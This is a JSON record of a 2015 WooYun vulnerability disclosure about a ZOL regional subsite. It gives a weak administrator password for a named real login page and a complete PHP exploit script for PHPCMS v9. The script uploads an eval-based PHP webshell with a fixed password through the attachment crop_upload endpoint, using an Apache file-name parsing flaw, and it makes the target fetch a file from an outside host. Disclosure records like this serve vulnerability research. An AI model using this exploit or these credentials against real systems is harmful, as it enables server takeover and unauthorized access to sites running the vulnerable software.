{"id": 40730, "wybug_id": "wooyun-2015-090967", "wybug_title": "ZOL某分站后台弱口令及PHPCMS版本漏洞(已GetShell)", "wybug_corp": "中关村在线", "wybug_author": "路人甲", "wybug_date": "2015-01-10 22:13", "wybug_open_date": "2015-01-15 22:14", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["弱口令", "任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  zol广西分站存在后台弱口令以及phpcmsV9文件上传漏洞，导致服务器沦陷1、弱口令http://gxzol.com/index.php?m=admin&c=index&a=login&pc_hash=admin/admin888\n\n2、phpcmsV9 getshell原理见 WooYun: PHPCMS v9 Getshell（Apache） \n<?phperror_reporting(E_ERROR);set_time_limit(0);$pass=\"ln\";print_r('+---------------------------------------------------------------------------+PHPCms V9 GETSHELL 0DAYcode by L.N.apache 适用(利用的apache的解析漏洞)+---------------------------------------------------------------------------+');if ($argc < 2) {print_r('+---------------------------------------------------------------------------+Usage: php '.$argv[0].' url pathExample:1.php '.$argv[0].' lanu.sinaapp.com2.php '.$argv[0].' lanu.sinaapp.com /phpcms+---------------------------------------------------------------------------+');exit;}$url = $argv[1];$path = $argv[2];$phpshell = '<?php @eval($_POST[\\''.$pass.'\\']);?>';$file = '1.thumb_.Php.JPG%20%20%20%20%20%20%20Php';if($ret=Create_dir($url,$path)){//echo $ret;$pattern = \"|Server:[^,]+?|U\";preg_match_all($pattern, $ret, $matches);if($matches[0][0]){if(strpos($matches[0][0],'Apache') == false){echo \"\\n亲！此网站不是apache的网站。\\n\";exit;}}$ret = GetShell($url,$phpshell,$path,$file);$pattern = \"|http:\\/\\/[^,]+?\\.,?|U\";preg_match_all($pattern, $ret, $matches);if($matches[0][0]){echo \"\\n\".'密码为: '.$pass.\"\\n\";echo \"\\r\\nurl地址: \".$matches[0][0].'JPG%20%20%20%20%20%20%20Php'.\"\\n\";exit;}else{$pattern = \"|\\/uploadfile\\/[^,]+?\\.,?|U\";preg_match_all($pattern, $ret, $matches);if($matches[0][0]){echo \"\\n\".'密码为: '.$pass.\"\\n\";echo \"\\r\\nurl地址:\".'http://'.$url.$path.$matches[0][0].'JPG%20%20%20%20%20%20%20Php'.\"\\n\";exit;}else{echo \"\\r\\n没得到！\\n\";exit;}}}function GetShell($url,$shell,$path,$js){    $content =$shell;    $data = \"POST \".$path.\"/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://\".$url.$path.\"/uploadfile/\".$js.\" HTTP/1.1\\r\\n\";    $data .= \"Host: \".$url.\"\\r\\n\";    $data .= \"User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\\r\\n\";    $data .= \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\";    $data .= \"Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n\";    $data .= \"Connection: close\\r\\n\";    $data .= \"Content-Length: \".strlen($content).\"\\r\\n\\r\\n\";    $data .= $content.\"\\r\\n\";    $ock=fsockopen($url,80);    if (!$ock){        echo \"\\n\".\"此网站没有回应,检测url是否输入正确\".\"\\n\";exit;    }else{fwrite($ock,$data);$resp = '';while (!feof($ock)){$resp.=fread($ock, 1024);}return $resp;}}function Create_dir($url,$path=''){    $content ='I love you';    $data = \"POST \".$path.\"/index.php?m=attachment&c=attachments&a=crop_upload&width=6&height=6&file=http://lanu.sinaapp.com/1.jpg HTTP/1.1\\r\\n\";    $data .= \"Host: \".$url.\"\\r\\n\";    $data .= \"User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\\r\\n\";    $data .= \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\";    $data .= \"Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n\";    $data .= \"Connection: close\\r\\n\";    $data .= \"Content-Length: \".strlen($content).\"\\r\\n\\r\\n\";    $data .= $content.\"\\r\\n\";    $ock=fsockopen($url,80);    if (!$ock){        echo \"\\n\".\"此网站没有回应,检测url是否输入正确\".\"\\n\";exit;    }fwrite($ock,$data);    $resp = '';    while (!feof($ock)){        $resp.=fread($ock, 1024);    }return $resp;}?>\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  改密码/升级   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-15 22:14 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}